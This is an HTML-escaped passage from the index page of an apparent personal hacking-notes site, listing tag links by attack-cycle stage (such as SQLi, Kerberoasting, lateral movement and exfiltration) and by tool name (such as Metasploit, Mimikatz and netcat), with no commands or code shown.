stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;A variety of notes about hacking, written for my own reference. Some notes date to the beginning of my cybersecurity journey and are very basic, while others come from later in my career and are more advanced. May you find something useful here.&lt;/p&gt;\n&lt;p&gt;Click on the tag for a list of notes related to that topic.&lt;/p&gt;\n&lt;h3 id=&quot;spells-by-attack-cycle-stage&quot;&gt;Spells by attack cycle stage&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#spells-by-attack-cycle-stage&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Reconnaissance&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Reconnaissance&quot;&gt;AttackCycle/Reconnaissance&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Reconnaissance/BruteForcing&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Reconnaissance/BruteForcing&quot;&gt;AttackCycle/Reconnaissance/BruteForcing&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Reconnaissance/Fuzzing&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Reconnaissance/Fuzzing&quot;&gt;AttackCycle/Reconnaissance/Fuzzing&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation&quot;&gt;AttackCycle/Exploitation&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation/AS-REPRoasting&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation/AS-REPRoasting&quot;&gt;AttackCycle/Exploitation/AS-REPRoasting&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation/BruteForcing&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation/BruteForcing&quot;&gt;AttackCycle/Exploitation/BruteForcing&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation/Kerberoasting&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation/Kerberoasting&quot;&gt;AttackCycle/Exploitation/Kerberoasting&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation/LocalFileInclusion&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation/LocalFileInclusion&quot;&gt;AttackCycle/Exploitation/LocalFileInclusion&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation/NullByteAttacks&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation/NullByteAttacks&quot;&gt;AttackCycle/Exploitation/NullByteAttacks&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation/SQLi&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation/SQLi&quot;&gt;AttackCycle/Exploitation/SQLi&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation/XSS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation/XSS&quot;&gt;AttackCycle/Exploitation/XSS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exploitation/XXE&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exploitation/XXE&quot;&gt;AttackCycle/Exploitation/XXE&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/AntiForensics&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/AntiForensics&quot;&gt;AttackCycle/AntiForensics&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/PrivEsc&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/PrivEsc&quot;&gt;AttackCycle/PrivEsc&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/PrivEsc/GoldenTickets&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/PrivEsc/GoldenTickets&quot;&gt;AttackCycle/PrivEsc/GoldenTickets&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/PrivEsc/PassTheHash&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/PrivEsc/PassTheHash&quot;&gt;AttackCycle/PrivEsc/PassTheHash&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/LateralMovement&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/LateralMovement&quot;&gt;AttackCycle/LateralMovement&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/LateralMovement/PassTheHash&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/LateralMovement/PassTheHash&quot;&gt;AttackCycle/LateralMovement/PassTheHash&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/LateralMovement/SilverTickets&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/LateralMovement/SilverTickets&quot;&gt;AttackCycle/LateralMovement/SilverTickets&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/CommandAndControl&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/CommandAndControl&quot;&gt;AttackCycle/CommandAndControl&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/AttackCycle/Exfiltration&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/AttackCycle/Exfiltration&quot;&gt;AttackCycle/Exfiltration&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;spells-for-specific-occassions&quot;&gt;Spells for specific occassions&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#spells-for-specific-occassions&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/HowTo&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/HowTo&quot;&gt;HowTo&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/LoLBins&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/LoLBins&quot;&gt;LoLBins&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Scripts&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Scripts&quot;&gt;Scripts&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;spells-dealing-with-specific-protocols-operating-systems-applications-etc&quot;&gt;Spells dealing with specific protocols, operating systems, applications, etc.&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#spells-dealing-with-specific-protocols-operating-systems-applications-etc&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application&quot;&gt;Application&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ADB&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ADB&quot;&gt;Application/ADB&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Aircrack&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Aircrack&quot;&gt;Application/Aircrack&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/arp&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/arp&quot;&gt;Application/arp&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/awk&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/awk&quot;&gt;Application/awk&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/base64&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/base64&quot;&gt;Application/base64&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/basenc&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/basenc&quot;&gt;Application/basenc&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/BurpSuite&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/BurpSuite&quot;&gt;Application/BurpSuite&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/cat&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/cat&quot;&gt;Application/cat&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Certify&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Certify&quot;&gt;Application/Certify&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/CertUtil&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/CertUtil&quot;&gt;Application/CertUtil&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/cewl&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/cewl&quot;&gt;Application/cewl&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/cmd&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/cmd&quot;&gt;Application/cmd&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/cmdkey&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/cmdkey&quot;&gt;Application/cmdkey&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/crackmapexec&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/crackmapexec&quot;&gt;Application/crackmapexec&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/CUPP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/CUPP&quot;&gt;Application/CUPP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/curl&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/curl&quot;&gt;Application/curl&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/DayOne&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/DayOne&quot;&gt;Application/DayOne&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/dd&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/dd&quot;&gt;Application/dd&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/dig&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/dig&quot;&gt;Application/dig&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/dir&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/dir&quot;&gt;Application/dir&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/dpkg-query&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/dpkg-query&quot;&gt;Application/dpkg-query&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/driverquery&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/driverquery&quot;&gt;Application/driverquery&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/enum4linux&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/enum4linux&quot;&gt;Application/enum4linux&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Evil-WinRM&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Evil-WinRM&quot;&gt;Application/Evil-WinRM&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Excel&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Excel&quot;&gt;Application/Excel&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ExifTool&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ExifTool&quot;&gt;Application/ExifTool&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ffmpeg&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ffmpeg&quot;&gt;Application/ffmpeg&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/find&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/find&quot;&gt;Application/find&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/findstr&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/findstr&quot;&gt;Application/findstr&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/finger&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/finger&quot;&gt;Application/finger&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Firefox&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Firefox&quot;&gt;Application/Firefox&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ftp&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ftp&quot;&gt;Application/ftp&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/fuff&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/fuff&quot;&gt;Application/fuff&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/gdb&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/gdb&quot;&gt;Application/gdb&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/getcap&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/getcap&quot;&gt;Application/getcap&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Git&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Git&quot;&gt;Application/Git&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/gobuster&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/gobuster&quot;&gt;Application/gobuster&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/GoodLock&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/GoodLock&quot;&gt;Application/GoodLock&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/GPG&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/GPG&quot;&gt;Application/GPG&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/grep&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/grep&quot;&gt;Application/grep&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Hashcat&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Hashcat&quot;&gt;Application/Hashcat&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/hostname&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/hostname&quot;&gt;Application/hostname&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Hydra&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Hydra&quot;&gt;Application/Hydra&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/icacls&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/icacls&quot;&gt;Application/icacls&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ifconfig&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ifconfig&quot;&gt;Application/ifconfig&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/iftop&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/iftop&quot;&gt;Application/iftop&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ike-scan&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ike-scan&quot;&gt;Application/ike-scan&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Impacket&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Impacket&quot;&gt;Application/Impacket&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ipconfig&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ipconfig&quot;&gt;Application/ipconfig&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/JohnTheRipper&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/JohnTheRipper&quot;&gt;Application/JohnTheRipper&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/jq&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/jq&quot;&gt;Application/jq&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/JumpDesktop&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/JumpDesktop&quot;&gt;Application/JumpDesktop&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/KeePassXC&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/KeePassXC&quot;&gt;Application/KeePassXC&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Kerbrute&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Kerbrute&quot;&gt;Application/Kerbrute&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/LAME&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/LAME&quot;&gt;Application/LAME&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ldd&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ldd&quot;&gt;Application/ldd&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/less&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/less&quot;&gt;Application/less&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/libVirt&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/libVirt&quot;&gt;Application/libVirt&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ls&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ls&quot;&gt;Application/ls&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/lslpp&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/lslpp&quot;&gt;Application/lslpp&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/man&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/man&quot;&gt;Application/man&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Metasploit&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Metasploit&quot;&gt;Application/Metasploit&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Metasploit/meterpreter&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Metasploit/meterpreter&quot;&gt;Application/Metasploit/meterpreter&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Metasploit/msfconsole&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Metasploit/msfconsole&quot;&gt;Application/Metasploit/msfconsole&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Metasploit/msfvenom&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Metasploit/msfvenom&quot;&gt;Application/Metasploit/msfvenom&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/MicrosoftRemoteDesktop&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/MicrosoftRemoteDesktop&quot;&gt;Application/MicrosoftRemoteDesktop&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Mimikatz&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Mimikatz&quot;&gt;Application/Mimikatz&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/more&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/more&quot;&gt;Application/more&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/MSSQL&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/MSSQL&quot;&gt;Application/MSSQL&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/MySQL&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/MySQL&quot;&gt;Application/MySQL&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/nano&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/nano&quot;&gt;Application/nano&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/nbtscan&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/nbtscan&quot;&gt;Application/nbtscan&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/net&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/net&quot;&gt;Application/net&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/netcat&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/netcat&quot;&gt;Application/netcat&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/netsh&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/netsh&quot;&gt;Application/netsh&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/netstat&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/netstat&quot;&gt;Application/netstat&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Nikto&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Nikto&quot;&gt;Application/Nikto&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Nmap&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Nmap&quot;&gt;Application/Nmap&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/NodeJS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/NodeJS&quot;&gt;Application/NodeJS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/nslookup&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/nslookup&quot;&gt;Application/nslookup&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Obsidian&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Obsidian&quot;&gt;Application/Obsidian&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/OneDrive&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/OneDrive&quot;&gt;Application/OneDrive&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/OpenSSL&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/OpenSSL&quot;&gt;Application/OpenSSL&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Oracle&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Oracle&quot;&gt;Application/Oracle&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/oscanner&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/oscanner&quot;&gt;Application/oscanner&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/oslevel&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/oslevel&quot;&gt;Application/oslevel&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/OWASPZAP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/OWASPZAP&quot;&gt;Application/OWASPZAP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ping&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ping&quot;&gt;Application/ping&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/PostgreSQL&quot; class=&quot;tag-link internal alias&quot; 